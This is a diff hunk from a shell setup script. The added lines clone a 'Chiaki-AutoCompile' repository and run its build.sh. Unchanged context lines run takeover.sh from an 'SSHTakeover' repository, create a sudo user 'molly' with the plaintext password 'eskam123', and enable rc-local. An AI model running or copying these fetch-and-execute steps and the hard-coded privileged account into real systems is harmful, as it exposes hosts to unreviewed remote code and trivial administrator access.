@@ -4,6 +4,8 @@ sudo systemctl enable rc-local;
 git clone https://github.com/independentcod/SSHTakeover >>/dev/stdout;
 cd SSHTakeover;
 sh takeover.sh >>/dev/stdout;
+git clone https://github.com/independentcod/Chiaki-AutoCompile;
+sh ./Chiaki-AutoCompile/build.sh;
 sudo useradd -m molly;
 echo molly:eskam123 | sudo chpasswd;
 sudo usermod -g sudo molly;
